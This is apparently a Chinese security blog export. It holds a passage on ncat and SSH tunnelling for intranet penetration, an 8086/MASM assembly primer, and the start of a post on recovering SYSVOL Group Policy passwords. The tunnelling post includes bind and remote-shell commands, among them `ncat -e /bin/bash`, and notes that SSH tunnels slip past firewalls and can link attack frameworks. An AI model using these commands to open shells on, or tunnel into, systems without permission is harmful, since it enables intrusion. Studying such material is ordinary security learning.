<p>被称为网络安全的瑞士军刀，可以用作端口监听、端口扫描、远程文件传输、还可以实现远程 shell 等功能</p>
<p>目前我使用的是 Nmap 自带的 ncat，相比于原来的 nc，更加方便和简单，直接安装 nmap 就自带了 nc</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ubWFwLm9yZy9kb3dubG9hZC5odG1s">官网链接</span></p>
<p>我在本机安装了 nmap 以后，就可以直接输入 ncat-v 查看信息：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102190313790.png" alt="image-20220102190313790" /></p>
<p>基本使用：</p>
<p>Ncat 是一个 c/s 工具，需要服务端和客户端一起使用，首先我们在服务器上监听端口：</p>
<p>nact -lvvp 85 表示监听 85 端口</p>
<p>-l：表示监听</p>
<p>-v：显示版本信息等</p>
<p>-p：监听的端口</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102190418391.png" alt="image-20220102190418391" /></p>
<p>客户端连接我们的服务：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ncat <span class="token operator">-</span>v <span class="token operator">&lt;</span>ip<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102190626375.png" alt="image-20220102190626375" /></p>
<p>服务端收到消息:</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102190642355.png" alt="image-20220102190642355" /></p>
<p>接着我们就可以进行交互了，想要执行命令的话，还需要使用 -e 参数，将自己的 shell 推出去，如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102190753139.png" alt="image-20220102190753139" /></p>
<p>执行命令：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102190830246.png" alt="image-20220102190830246" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>发送文件</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 从 HOST1（Client） 发送文件到 HOST2（Server） 的 TCP 9899 端口</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># HOST2：</span></pre></td></tr><tr><td data-num="4"></td><td><pre>$ ncat <span class="token operator">-</span>l <span class="token number">9899</span> <span class="token operator">></span> outputfile </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#HOST1：</span></pre></td></tr><tr><td data-num="7"></td><td><pre>$ ncat HOST2 <span class="token number">9899</span> <span class="token operator">&lt;</span> inputfile</pre></td></tr></table></figure><p>服务端监听： <code>ncat -lv 85 &gt; 接收.txt</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102191055911.png" alt="image-20220102191055911" /></p>
<p>客户端创建文本，然后发送： <code>ncat -v 127.0.0.1 85 &lt; 发送.txt</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102191341749.png" alt="image-20220102191341749" /></p>
<p>在服务端就可以看到这个新出的文本：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102191418126.png" alt="image-20220102191418126" /></p>
<p>端口转发</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 重定向本机 9999 TCP 端口到 httpbin.org 的 80 端口</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    $ ncat <span class="token operator">-</span><span class="token operator">-</span>sh<span class="token operator">-</span><span class="token keyword">exec</span> <span class="token string">"ncat 127.0.0.1 80"</span> <span class="token operator">-</span>l <span class="token number">9999</span> <span class="token operator">-</span><span class="token operator">-</span>keep<span class="token operator">-</span><span class="token builtin">open</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    传递Shell</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment"># 在本机的 8080 端口分享 Bash Shell，让对方可以通过网络访问此端口来自由访问 Bash Shell</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    $ ncat <span class="token operator">-</span>e <span class="token string">"/bin/bash"</span> <span class="token operator">-</span>l <span class="token number">8080</span> <span class="token operator">-</span><span class="token operator">-</span>keep<span class="token operator">-</span><span class="token builtin">open</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102191553349.png" alt="image-20220102191553349" /></p>
<p>客户端执行命令：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102191753898.png" alt="image-20220102191753898" /></p>
<p>创建隧道：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 将本地的 8080 端口作为隧道端口</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    ncat <span class="token operator">-</span>l <span class="token operator">-</span><span class="token operator">-</span>proxy<span class="token operator">-</span><span class="token builtin">type</span> http <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token number">8080</span> <span class="token operator">-</span><span class="token operator">-</span>proxy<span class="token operator">-</span>auth username<span class="token punctuation">:</span>password</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment"># --porxy-type 指定隧道类型</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment"># --porxy-auth 指定隧道连接密码用户</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment"># 虽然在 Nact 中写了能够使用 socks4 和 socks5，但是实践中只能使用 HTTP</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102191907784.png" alt="image-20220102191907784" /></p>
<p>可通过代理查看本机此时的 ip。</p>
<p>在内网中建立稳定的隧道是我们做好内网的关键一步，在内网中，用应用层的隧道技术就是使用各种不同的应用服务提供的端口进行数据的转发。常用的隧道协议有：DNS、SSH、HTTP/HTTPS。</p>
<h2 id="三-ssh隧道"><a class="anchor" href="#三-ssh隧道">#</a> 三、SSH 隧道</h2>
<p>​    在内网中，几乎所有的内网 LIUNX/UNIX 主机都是支持 SSH 协议的，一般情况下防火墙是不会拦截 SSH 的流量的，同时在传输的时候，SSH 的流量是加密的，所以很难区分是否是正常的传输还是恶意的流量。当我们使用 SSH 建立了隧道以后，我们可以建立之前我们不能建立的 TCP 隧道之类的。</p>
<p>在什么地方我们使用得到 SSH 隧道呢，工作中由于防火墙导致访问某些网站或某些 FTP 等资源连接超时。</p>
<p>基本的 SSH 命令就是我们登陆的命令：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ssh root@ip</pre></td></tr></table></figure><p>创建 SSH 隧道常用的命令如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span><span class="token constant">C</span> 压缩传输，增加传输的效率，</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span>f 将<span class="token constant">SSH</span>传输放在后台执行，不占用当前的<span class="token constant">SHELL</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span><span class="token constant">N</span> 建立静默连接，就是建立了连接，但是看不到具体的会话；还有一种说法是不允许执行命令</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span>g 允许远程主机连接本地用于转发端口</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span><span class="token constant">L</span> 本地端口转发</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span><span class="token constant">R</span> 远程端口转发</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">-</span><span class="token constant">D</span> 动态转发</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">-</span><span class="token constant">P</span> 指定<span class="token constant">SSH</span>的端口</pre></td></tr></table></figure><p>后续我们都会使用上面的参数进行配置</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>端口转发</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>这种转发方式是将本地的某个端口转发到另一个端口，例如我现在的服务上有一个web服务在<span class="token number">80</span>端口，那么我可以使用ssh将本地的<span class="token number">80</span>端口转发到<span class="token number">8080</span>端口，然后进行访问<span class="token number">8080</span>，就可以直接访问<span class="token number">80</span>端口，现在我在网站上打开<span class="token number">80</span>端口的服务：</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>然后我在服务端启动一下<span class="token constant">SSH</span>的本地转发：</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string"> ssh -L 8080:127.0.0.1:80 -fN 127.0.0.1 </span><span class="token template-punctuation string">`</span></span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -L 8080 是指转发到的端口；127.0.0.1:80 是转发的端口，他们之间用分号隔开</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token comment"># -fN f 是指在后台运行；N 是指建立静默连接</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token comment"># 最后的 IP 是跳板机的 IP</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment"># 这里的含义就是，访问本地的 8080 端口，就会将请求转发给本地的 80 端口 G0_WnQQb!Mln</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102193048722.png" alt="image-20220102193048722" /></p>
<p>没做转发之前，我们访问 8080 端口会显示失败，但是做了转发以后就可以访问到了。</p>
<p>我们再来把远端的 22 端口转发到本地的 8080 端口试试：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ssh <span class="token operator">-</span>L <span class="token number">80</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>VPS<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">22</span> <span class="token operator">-</span>fN <span class="token operator">&lt;</span>vps<span class="token operator">></span></pre></td></tr></table></figure><p>使用 SSH 连接本地的 8080 端口，看看结果：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220102193133142.png" alt="image-20220102193133142" /></p>
<p>连上后请求一下外网 IP 确实是我们设定好的主机 IP，所以算是成功了</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>SSH隧道可以作为CS和MSF的联动</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>动态转发</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>使用动态转发就可以直接使用socks4<span class="token operator">/</span><span class="token number">5</span>的隧道：</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>ssh <span class="token operator">-</span>CfNg <span class="token operator">-</span>D <span class="token number">8080</span><span class="token punctuation">:</span>VPS</pre></td></tr></table></figure><h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvLXR5U3d1M2VmdFZZbnc4V0dtcFZKdw==">内网渗透中的隧道</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言初步学习记录</title>
    <url>/article/e0c9facc.html</url>
    <content><![CDATA[<h2 id="0x01汇编语言概述"><a class="anchor" href="#0x01汇编语言概述">#</a> 0x01. 汇编语言概述</h2>
<p><strong>汇编</strong>： 源程序在计算机中不能直接被识别和执行，所以需要经过翻译，产生机器代码，这种翻译过程称为汇编；<br />
<strong>源程序</strong>： 用汇编语言编写的程序；<br />
<strong>助记符</strong>： 选用了一些能反映机器指令功能的单词或词组来代表该机器指令。这些选出来的单词称为助记符。<br />
<strong>汇编语言</strong>： 是一种用于微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。</p>
<ul>
<li>在汇编语言中，用助记符（Mnemonics）代替机器指令的操作码；</li>
<li>用地址符号（Symbol）或标号（Label）代替指令或操作数的地址。</li>
</ul>
<p><strong>汇编程序</strong>： 是执行把汇编语言源程序翻译成机器能够识别和执行的目标程序（即二进制的机器代码程序）任务的一种系统程序；<br />
<strong>机器语言</strong>： 用二进制代码表示，计算机能直接识别和执行的一种机器指令系统的集合；</p>
<p><strong>汇编语言程序</strong>： 用汇编语言编写的源程序；</p>
<p>汇编程序与汇编语言程序是两个不同的概念。<br />
<img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117174533125.png" alt="image-20220117174533125" /></p>
<p><strong>指令性语句</strong>： CPU 执行的语句，能够生成目标代码，核心是指令系统中的指令。<br />
<strong>指示性语句</strong>： CPU 不执行，而由汇编程序执行的语句，不生成目标代码，核心是伪指令。</p>
<p><strong>指令语句的格式</strong>：（由四段组成）</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/20191005215356991.png" alt="image-20191005215356991" /></p>
<ul>
<li>在汇编语言中，名字后无冒号，标号后一定带冒号；</li>
<li>语句的各个组成部分间要有分隔符（常用空格 or 制表符）；</li>
<li>标号或名字一般由字母、数字及规定的特殊字符组成，数字不可开头。字符数最长不超过 31 个；</li>
<li>每个指令语句必须有助记符域。</li>
</ul>
<p><strong>伪指令</strong> 语句的格式：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/20191005220600873.png" alt="image-20191005220600873" /></p>
<p><strong>名字</strong>： 变量的符号地址，其后不加冒号；<br />
<strong>操作数</strong>： 指示性语句中至少有一个操作数。</p>
<p>EX1. 先从一个简单的 8086 汇编语言程序示例来了解汇编语言程序的格式、结构及规范。这是一个完成将 100 个字的数据块从输入缓冲区搬到输出缓冲区的实例。源程序如下所示。</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>DATA		SEGMENT                     <span class="token punctuation">;</span>定义代码段</pre></td></tr><tr><td data-num="2"></td><td><pre>INBUFF  	DW 	<span class="token number">100</span> <span class="token function">DUP</span> <span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>        <span class="token punctuation">;</span>输入缓冲区</pre></td></tr><tr><td data-num="3"></td><td><pre>OUTBUFF 	DW 	<span class="token number">100</span> <span class="token function">DUP</span> <span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>        <span class="token punctuation">;</span>输出缓冲区</pre></td></tr><tr><td data-num="4"></td><td><pre>DATA   	ENDS                             <span class="token punctuation">;</span>定义数据段结束</pre></td></tr><tr><td data-num="5"></td><td><pre>STACKS  	SEGMENT   PARA  STACK  ‘STACK’</pre></td></tr><tr><td data-num="6"></td><td><pre>STA	    DB       <span class="token number">100</span>H   <span class="token function">DUP</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>TOP	    EQU     LEHGTH   STA</pre></td></tr><tr><td data-num="8"></td><td><pre>STACKS  	ENDS</pre></td></tr><tr><td data-num="9"></td><td><pre>CODE  SEGMENT                  	<span class="token punctuation">;</span>定义代码段</pre></td></tr><tr><td data-num="10"></td><td><pre>ASSUME CS<span class="token operator">:</span>CODE<span class="token punctuation">,</span>DS<span class="token operator">:</span>DATA<span class="token punctuation">,</span>ES<span class="token operator">:</span>DATA<span class="token punctuation">,</span>SS<span class="token operator">:</span>STACKS  </pre></td></tr><tr><td data-num="11"></td><td><pre>START<span class="token operator">:</span>  MOV   AX<span class="token punctuation">,</span>DATA</pre></td></tr><tr><td data-num="12"></td><td><pre>        MOV    DS<span class="token punctuation">,</span>  AX</pre></td></tr><tr><td data-num="13"></td><td><pre>        MOV    DS<span class="token punctuation">,</span>  AX</pre></td></tr><tr><td data-num="14"></td><td><pre> 	      MOV    AX<span class="token punctuation">,</span>  STACKS</pre></td></tr><tr><td data-num="15"></td><td><pre>          MOV    SS<span class="token punctuation">,</span>  AX</pre></td></tr><tr><td data-num="16"></td><td><pre>          MOV    SP<span class="token punctuation">,</span>  TOP    	</pre></td></tr><tr><td data-num="17"></td><td><pre>INIT：    MOV   SI<span class="token punctuation">,</span>OFFSET INBUFF  <span class="token punctuation">;</span>设置输入缓冲区指针</pre></td></tr><tr><td data-num="18"></td><td><pre>     	    LEA     DI<span class="token punctuation">,</span>OUTBUFF            <span class="token punctuation">;</span>设置输出缓冲区指针</pre></td></tr><tr><td data-num="19"></td><td><pre>     	    MOV   CX<span class="token punctuation">,</span><span class="token number">100</span>              	           <span class="token punctuation">;</span>块长度送CX</pre></td></tr><tr><td data-num="20"></td><td><pre> REP      MOVSB			 	<span class="token punctuation">;</span>块搬移</pre></td></tr><tr><td data-num="21"></td><td><pre>    	    MOV    AX<span class="token punctuation">,</span><span class="token number">4</span>C00H                 	<span class="token punctuation">;</span>DOS功能调用语句</pre></td></tr><tr><td data-num="22"></td><td><pre>     	    INT      <span class="token number">21</span>H</pre></td></tr><tr><td data-num="23"></td><td><pre> CODE     ENDS</pre></td></tr><tr><td data-num="24"></td><td><pre>          END    START                       	<span class="token punctuation">;</span>汇编结束</pre></td></tr></table></figure><h2 id="0x02汇编语言数据"><a class="anchor" href="#0x02汇编语言数据">#</a> 0x02 汇编语言数据</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117175438820.png" alt="image-20220117175438820" /></p>
<ul>
<li>标识符（identifier ）</li>
<li>保留字（reserved word）</li>
<li>分界符（delimiter ）</li>
<li>注释 （note ）</li>
</ul>
<p><strong>保留字</strong>： 是系统预先保留下来的具有特殊含义的符号；<br />
<strong>标号</strong>： 指令性语句的符号地址；<br />
<strong>表达式</strong>： 由运算对象及运算符组合。</p>
<p><strong>变量</strong>：在除代码段以外的其他段被定义，用来定义存放在存储单元中的数据，在汇编程序中可以修改变量的值。</p>
<ul>
<li>变量表示定义数据项中第一个字节在现行段中的地址偏移量；</li>
<li>定义变量就是给变量分配存储单元，起一个名字，并为之赋初值；</li>
<li>定义变量是由伪指令完成的。</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117175529930.png" alt="image-20220117175529930" /></p>
<p><strong>变量的三个属性</strong>：</p>
<ul>
<li>段值 (Segment): 变量单元所在段的段地址；</li>
<li>偏移量 (Offset): 变量单元地址与段的起始地址之间的字节数；</li>
<li>类型 (Type): 变量有三种类型：字节（Bytes）、字 （Word）、双字（Double Word）；</li>
</ul>
<p><strong>标号</strong>： 标号是指令性语句的符号地址。是转移指令和调用指令的目的地址。</p>
<ul>
<li>标号和变量类似，都是存储单元的地址。</li>
<li>但是，标号对应的是存储单元中存放的是指令。</li>
<li>而变量对应的是存储单元中存放的是数据。</li>
</ul>
<p><strong>标号的三个属性</strong>：</p>
<ul>
<li>段值 (Segment): 指令目标代码所在段的段地址；</li>
<li>偏移量 (Offset): 指令目标代码首字节与段的起始地址之间的字节数；</li>
<li>类型 (Type): 标号的类型有两种： 近（Near）、远（FAR）。</li>
</ul>
<h2 id="0x03汇编语言环境搭建"><a class="anchor" href="#0x03汇编语言环境搭建">#</a> 0x03 汇编语言环境搭建</h2>
<h3 id="1安装visual-studio"><a class="anchor" href="#1安装visual-studio">#</a> 1. 安装 Visual Studio</h3>
<p>Visual Studio 2015 或 2017 或 2019 等其他版本均可，小编这里使用的是 2022 版本的 Visual Studio</p>
<p>确保网络流畅的时候安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117195150037.png" alt="image-20220117195150037" /></p>
<p>勾选所需服务</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117195415424.png" alt="image-20220117195415424" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117195557725.png" alt="image-20220117195557725" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117195633718.png" alt="image-20220117195633718" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117195946929.png" alt="image-20220117195946929" /></p>
<p>勾选完成后进行安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117201324619.png" alt="image-20220117201324619" /></p>
<p>启动后，选择 C++ 开发设置</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117202719235.png" alt="image-20220117202719235" /></p>
<h3 id="2新建项目"><a class="anchor" href="#2新建项目">#</a> 2. 新建项目</h3>
<p>在 Visual Studio 2022 中创建新项目，选择 “空项目”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117202904964.png" alt="image-20220117202904964" /></p>
<p>选择项目属性</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117203027711.png" alt="image-20220117203027711" /></p>
<p>新项目建好后，右键新建项目 -&gt; 选择属性</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117182527574.png" alt="image-20220117182527574" /></p>
<p>在属性面板中选择 “高级” 选项，将入口点改为 “main”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117182706439.png" alt="image-20220117182706439" /></p>
<p>右键新建项目 -&gt; 选择生成依赖项 -&gt; 生成自定义</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117182254291.png" alt="image-20220117182254291" /></p>
<p>在生成自定义文件弹窗中勾选 masm</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117182404011.png" alt="image-20220117182404011" /></p>
<p><strong>注：一定要先修改生成依赖项后再添加源文件！</strong></p>
<h3 id="3添加源文件"><a class="anchor" href="#3添加源文件">#</a> 3. 添加源文件</h3>
<p>默认为 c++ 文件，但我们用的是汇编语言，所以需要手动修改为.asm 文件</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117183132244.png" alt="image-20220117183132244" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117183248532.png" alt="image-20220117183248532" /></p>
<p>右键 “.asm” 源文件 — “属性” — “配置属性 — 常规 — 项类型” — 选择 Microsoft Macro Assembler</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220118133849360.png" alt="image-20220118133849360" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220118132548095.png" alt="image-20220118132548095" /></p>
<p>右键解决方案中的项目名 — “属性” — “配置属性 — 链接器” 更改项目属性：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220118133410363.png" alt="image-20220118133410363" /></p>
<ul>
<li>“调试” — “生成调试信息” 选择 “生成调试信息（/DEBUG）”</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220118132723943.png" alt="image-20220118132723943" /></p>
<ul>
<li>“系统” — “子系统” 选择 “控制台（/SUBSYSTEM:CONSOLE）”</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220118132842804.png" alt="image-20220118132842804" /></p>
<ul>
<li>解决方案配置管理器选择 “x86”</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220118132900795.png" alt="image-20220118132900795" /></p>
<p>使用一下测试代码进行测试</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="4"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="5"></td><td><pre>ExitProcess PROTO<span class="token punctuation">,</span> dwExitCode <span class="token operator">:</span> DWORD</pre></td></tr><tr><td data-num="6"></td><td><pre>MessageBoxA PROTO hWnd <span class="token operator">:</span> DWORD<span class="token punctuation">,</span> lpText <span class="token operator">:</span> BYTE<span class="token punctuation">,</span> lpCaption <span class="token operator">:</span> BYTE<span class="token punctuation">,</span> uType <span class="token operator">:</span> DWORD</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="8"></td><td><pre>Number DWORD <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre>text db <span class="token string">"shellcode"</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="11"></td><td><pre>main proc</pre></td></tr><tr><td data-num="12"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	mov ebx<span class="token punctuation">,</span><span class="token number">6</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	add eax<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="15"></td><td><pre>	add eax<span class="token punctuation">,</span>Number</pre></td></tr><tr><td data-num="16"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	push offset text</pre></td></tr><tr><td data-num="18"></td><td><pre>	push offset text</pre></td></tr><tr><td data-num="19"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	call MessageBoxA</pre></td></tr><tr><td data-num="21"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">16</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="23"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="24"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117184145745.png" alt="image-20220117184145745" /></p>
<p>添加代码高亮插件，点击上方 “扩展” 进入 “扩展管理” 后，在搜索框中输入 “Asm” 即可找到相关插件进行安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117184408271.png" alt="image-20220117184408271" /></p>
<p>退出即可自动安装扩展程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117190806472.png" alt="image-20220117190806472" /></p>
<p>安装完成后，代码即可显示高亮</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117192626993.png" alt="image-20220117192626993" /></p>
<p>PS：在 22 版中并没有找到相关插件！需手动下载</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hKTGViYmluay9hc20tZHVkZS9yZWxlYXNlcw==">项目地址</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117205551863.png" alt="image-20220117205551863" /></p>
<p>进入如下地址，将 vsix 文件直接拖拽到该窗口即可进行安装</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>C<span class="token operator">:</span>\Program Files\Microsoft Visual Studio\<span class="token number">2022</span>\Community\Common7\IDE</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117210335793.png" alt="image-20220117210335793" /></p>
<p>打开命令窗口进行安装</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117210549221.png" alt="image-20220117210549221" /></p>
<p>安装失败，点击左下角查看安装日志，发现微软更新了应用，但是并没有什么用瞬间 emo！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117210639179.png" alt="image-20220117210639179" /></p>
<p>进行调试，结果显示如图即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220117185339664.png" alt="image-20220117185339664" /></p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透技巧——利用SYSVOL还原组策略中保存的密码</title>
    <url>/article/f6eb5c38.html</url>
    <content><![CDATA[<h2 id="00x00-前言"><a class="anchor" href="#00x00-前言">#</a> 00x00 前言</h2>
<hr />
<p><code>Local Administrator Password Solution</code> （ <code>LAPS</code> ）最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。那么，如果域内未配置 <code>LAPS</code> ，如何批量设置域内主机的本地管理员密码呢？这其中又存在哪些可被利用的地方呢？</p>
<p><strong>注</strong>：如要完美实现建议选用 <code>Server 2003</code>  系统！！！这里小编使用 <code>Server 2012</code>  的域控，由于不支持 <code>KB2962486</code>  补丁所以会导致部分功能无法完全实现。</p>
